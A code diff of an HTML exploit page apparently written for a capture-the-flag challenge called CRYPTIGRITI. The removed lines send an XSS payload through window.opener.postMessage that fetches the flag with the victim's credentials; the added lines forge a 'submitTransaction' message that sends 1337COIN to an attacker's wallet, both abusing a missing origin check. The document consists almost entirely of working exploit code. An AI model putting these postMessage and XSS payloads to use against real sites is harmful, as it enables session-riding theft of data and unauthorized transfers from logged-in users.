@@ -1,23 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CRYPTIGRITI Flag Exploit</title>
+    <title>Send 1337COIN Exploit</title>
 </head>
 <body>
-<h1>Send XSS to get flag</h1>
 <script>
-// Wait a moment then send the exploit
+// Listen for any responses
+window.addEventListener('message', (event) => {
+    console.log('Response from target:', event.data);
+});
+
+// Send the exploit
 setTimeout(() => {
-    // Target must be buy.html page
-    window.opener.postMessage({
-        type: 'updateContent',      // Must match exactly
-        widgetId: 'salesWidget',    // Target div ID from buy.html
-        content: '<img src=x onerror="document.getElementById(\'flagBanner\').classList.remove(\'hidden\'); fetch(\'/api/flag\',{credentials:\'include\'}).then(r=>r.json()).then(d=>{if(d.flag){document.getElementById(\'flagText\').textContent=\'FLAG: \'+d.flag;}})">'
-    }, '*'); // No origin check - the vulnerability
+    const exploitPayload = {
+        type: 'submitTransaction',
+        transaction: {
+            toAddress: '10970063d33e32396bb80753a2b902d56', // Your wallet
+            currency: '1337COIN',  // Special CTF currency
+            amount: 1337  // CTF number
+        }
+    };
     
-    alert('XSS payload sent! Check buy.html for flag banner.');
-}, 1000);
+    console.log('Sending exploit:', exploitPayload);
+    
+    // Send to checkout page
+    window.opener.postMessage(exploitPayload, '*');
+    
+    alert('Exploit sent! Check if transaction succeeded.');
+}, 1500);
 </script>
-<p>Make sure you are logged into CRYPTIGRITI and have buy.html open.</p>
+<h3>1337COIN Transfer Exploit</h3>
+<p>Make sure:</p>
+<ol>
+    <li>You're logged into CRYPTIGRITI</li>
+    <li>checkout.html is open in another tab</li>
+    <li>Check console for responses (F12 → Console)</li>
+</ol>
 </body>
 </html>
